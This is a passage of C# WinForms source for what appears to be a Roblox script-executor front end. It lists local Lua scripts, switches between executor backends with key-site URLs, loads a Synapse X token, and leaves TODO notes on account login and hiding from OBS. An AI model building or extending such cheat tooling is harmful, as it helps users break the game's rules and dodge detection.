                flatTextBox2.ForeColor = Color.White;
            }
        }

        private void flatTextBox2_Leave(object sender, EventArgs e)
        {
            if (flatTextBox2.Text == "")
            {
                flatTextBox2.Text = "Game id";
                flatTextBox2.ForeColor = Color.White;
            }
        }

        private void flatTextBox3_Enter(object sender, EventArgs e)
        {
            if (flatTextBox3.Text == "Name")
            {
                flatTextBox3.Text = "";
                flatTextBox3.ForeColor = Color.White;
            }
        }

        private void flatTextBox3_Leave(object sender, EventArgs e)
        {
            if (flatTextBox3.Text == "")
            {
                flatTextBox3.Text = "Name";
                flatTextBox3.ForeColor = Color.White;
            }
        }

        private void richTextBox1_Enter(object sender, EventArgs e)
        {
            if (richTextBox1.Text == "Config name")
            {
                richTextBox1.Text = "";
                richTextBox1.ForeColor = Color.White;
            }
        }

        private void richTextBox1_Leave(object sender, EventArgs e)
        {
            if (richTextBox1.Text == "")
            {
                richTextBox1.Text = "Config name";
                richTextBox1.ForeColor = Color.White;
            }
        }

        private void comboBox1_SelectedIndexChanged_1(object sender, EventArgs e)
        {
            ComboBox a = sender as ComboBox;
            listBox1.Items.Clear();
            siticoneButton16.Hide();
            listBox1.Size = new Size(100, 143);
            maskedTextBox1.Text = "";

            if (a.Items[a.SelectedIndex].ToString() == "scripts")
            {
                Functions.PopulateListBox(listBox1, "./Scripts", "*.txt");
                Functions.PopulateListBox(listBox1, "./Scripts", "*.lua");
            }
            if (a.Items[a.SelectedIndex].ToString() == "autoexec")
            {
                Functions.PopulateListBox(listBox1, "./autoexec", "*.txt");
                Functions.PopulateListBox(listBox1, "./autoexec", "*.lua");
            }
            if (a.Items[a.SelectedIndex].ToString() == "workspace")
            {
                Functions.PopulateListBox(listBox1, "./workspace", "*");
            }
            if (a.Items[a.SelectedIndex].ToString() == "scripts++")
            {
                listBox1.Size = new Size(100, 117);
                //listBox1.Items.Add("IY Admin");
                //listBox1.Items.Add("Dark Titan Rebon");
                //listBox1.Items.Add("Dark Dex V1.1.0");
                siticoneButton16.Show();
            }
        }

        private void siticoneButton20_Click(object sender, EventArgs e)
        {
            System.Diagnostics.Process.Start("file:///"+AppDomain.CurrentDomain.BaseDirectory+"discord.html");
            
        }

        private void flatContextMenuStrip1_Opening(object sender, CancelEventArgs e)
        {
            if (comboBox1.SelectedIndex == 3)
            {
                deleteToolStripMenuItem.Text = "Save";
            }
        }
        shub fo;
        private void siticoneButton16_Click(object sender, EventArgs e)
        {
            
            
            fo.Show();
            fo.TopMost = this.TopMost;
            fo.Location = new Point(this.Location.X + 650, this.Location.Y + 18);

        }
        private bool res_ = true;
        private void maskedTextBox1_TextChanged(object sender, EventArgs e)
        {
            
            List<string> searched = new List<string>();
            searched.Clear();
            if (maskedTextBox1.Text == string.Empty)
            {
                reToolStripMenuItem.PerformClick();
                searched.Clear();
            }
            else
            {
                if (comboBox1.SelectedIndex == 3)
                {
                    //IWebDriver driver = new FirefoxDriver();
                    //driver.Navigate().GoToUrl("https://robloxscripts.com/");
                    //driver.FindElement(By.Id("s")).SendKeys(maskedTextBox1.Text);
                    //driver.FindElement(By.Id("searchsubmit")).Click();




                    //System.Console.WriteLine("Page title is: " + driver.Title);
                    //driver.Quit();
                }
                else
                {
                    res_ = true;
                    reToolStripMenuItem.PerformClick();
                    res_ = false;
                    searched.Clear();
                    while (listBox1.FindString(maskedTextBox1.Text) != ListBox.NoMatches)
                    {
                        searched.Add(listBox1.Items[listBox1.FindString(maskedTextBox1.Text)].ToString());
                        listBox1.Items.Remove(listBox1.Items[listBox1.FindString(maskedTextBox1.Text)]);
                    }
                    listBox1.Items.Clear();

                    listBox1.Items.AddRange(searched.ToArray());
                    searched.Clear();
                }
            }
        }

        private void siticoneButton26_Click(object sender, EventArgs e)
        {
            flatTextBox1.Text = string.Empty;
        }

        private void tabControl1_DrawItem(object sender, DrawItemEventArgs e)
        {
            e.Graphics.DrawString("x", e.Font, Brushes.Black, e.Bounds.Right - 15, e.Bounds.Top + 4);
            e.Graphics.DrawString(this.tabControl1.TabPages[e.Index].Text, e.Font, Brushes.Black, e.Bounds.Left + 0, e.Bounds.Top + 4);
            e.DrawFocusRectangle();
        }

        private void tabControl1_MouseDown(object sender, MouseEventArgs e)
        {
            for (int i = 0; i < tabControl1.TabPages.Count; i++)
            {
                Rectangle r = tabControl1.GetTabRect(i);
                Rectangle closebutton = new Rectangle(r.Right - 15, r.Top + 4, 15, 13);
                if (closebutton.Contains(e.Location))
                {
                    if (tabControl1.TabCount > 1)
                    {
                        this.tabControl1.TabPages.RemoveAt(i);
                        //this.siticoneButton11.Location = new Point(siticoneButton11.Location.X - 61, 51);
                    }
                    if (tabControl1.TabCount < 2)
                    {
                        siticoneButton11.Show();
                    }
                    if (tabControl1.TabCount < 7)
                    {
                        siticoneButton11.Show();
                    }
                }
            }
        }
        public string token;
        private void siticoneButton17_Click(object sender, EventArgs e)
        {
            if (keysite != string.Empty)
            {
                System.Diagnostics.Process.Start(keysite);
            }
            else
            {
                if (siticoneButton17.Text == "select token")
                {
                    OpenFileDialog openFileDialog1 = new OpenFileDialog();
                    if (openFileDialog1.ShowDialog() == DialogResult.OK)
                    {
                        OpenFileDialog Dialog = new OpenFileDialog
                        {
                            Title = "Select Synapse X Token",
                        };

                        token = File.ReadAllText(openFileDialog1.FileName);
                    }
                }

            }
        }

        private void tabControl1_Selecting(object sender, TabControlCancelEventArgs e)
        {
            if (e.TabPageIndex == this.tabControl1.TabCount - 1)
                e.Cancel = true;
        }
       

        private void panel5_MouseDown(object sender, MouseEventArgs e)
        {
            lastPoint = new Point(e.X, e.Y);
        }

        private void panel5_MouseMove(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                this.Left += e.X - lastPoint.X;
                this.Top += e.Y - lastPoint.Y;
            }
        }

        private void siticoneComboBox2_SelectedIndexChanged(object sender, EventArgs e)
        {
            tabControl1.TabPages.Clear();
            siticoneButton11.PerformClick();
        }

        private void toolStripTextBox1_MouseEnter(object sender, EventArgs e)
        {
            toolStripTextBox1.BackColor= Color.Red;
        }

        private void toolStripTextBox1_MouseLeave(object sender, EventArgs e)
        {
            toolStripTextBox1.BackColor = Color.FromArgb(45, 45, 45);
        }

        private void Form2_FormClosing(object sender, FormClosingEventArgs e)
        {
            Properties.Settings.Default.Save();
            Environment.Exit(0);
        }

        private void weao(int i)
        {
            ///나중에 할거임
        }

        private void siticoneComboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            


            Properties.Settings.Default.API = siticoneComboBox1.SelectedIndex;
            siticoneButton17.Enabled = true;
            keysite = string.Empty;

            switch (siticoneComboBox1.SelectedIndex)
            {
                case 0:
                    siticoneButton17.Text = "None";
                    siticoneButton17.Enabled = false;
                    siticoneCheckBox5.Checked = false;
                    siticoneCheckBox5.Text = "InternalUI(No)";
                    siticoneCheckBox5.ForeColor = Color.Red;
                    siticoneCheckBox5.Enabled = false;
                    //ex
                    break;

                case 1:
                    siticoneButton17.Text = "None";
                    siticoneButton17.Enabled = false;
                    siticoneCheckBox5.Checked = false;
                    siticoneCheckBox5.Text = "InternalUI(No)";
                    siticoneCheckBox5.ForeColor = Color.Red;
                    siticoneCheckBox5.Enabled = false;
                    weao(5);
                    //wrd
                    break;

                case 2:
                    keysite = "https://krnl.place/getkey.php";
                    siticoneButton17.Text = "Get Key";
                    siticoneCheckBox5.Checked = false;
                    siticoneCheckBox5.Text = "InternalUI(No)";
                    siticoneCheckBox5.ForeColor = Color.Red;
                    siticoneCheckBox5.Enabled = false;
                    weao(2);
                    //krnl
                    break;

                case 3:
                    keysite = "https://fluxteam.net/android/checkpoint/start.php";
                    siticoneButton17.Text = "Get Key";
                    siticoneCheckBox5.Enabled = true;
                    siticoneCheckBox5.Text = "InternalUI";
                    siticoneCheckBox5.ForeColor = Color.White;
                    weao(7);
                    //fluxus
                    break;

                case 4:
                    keysite = "https://oxygenu.xyz/KeySystem/Start.php";
                    siticoneButton17.Text = "Get Key";
                    siticoneCheckBox5.Checked = false;
                    siticoneCheckBox5.Text = "InternalUI(No)";
                    siticoneCheckBox5.ForeColor = Color.Red;
                    siticoneCheckBox5.Enabled = false;
                    weao(6);
                    //oxy
                    break;

                case 5:
                    siticoneButton17.Text = "None";
                    siticoneButton17.Enabled = false;
                    siticoneCheckBox5.Checked = false;
                    siticoneCheckBox5.Text = "InternalUI(No)";
                    siticoneCheckBox5.ForeColor = Color.Red;
                    siticoneCheckBox5.Enabled = false;
                    //any
                    break;

                case 6:
                    keysite = string.Empty;
                    siticoneButton17.Text = "select token";
                    siticoneCheckBox5.Enabled = true;
                    siticoneCheckBox5.Text = "InternalUI";
                    siticoneCheckBox5.ForeColor = Color.White;
                    //syn
                    break;
            }
        }

        private void siticoneButton19_Click(object sender, EventArgs e)
        {
            listBox2.Items.Add("아직 안만듦 ㅅㄱ");
        }

        private void siticoneButton12_Click_1(object sender, EventArgs e)
        {
            listBox2.Items.Remove(listBox2.SelectedItem);
        }
    }
}

//저장하는거 남음
//그리고 그 로블 계정 로그인이랑
//config...
//obs hide.......................................
//more dll <<--이건 보류

//gist, pastebin
//plugin
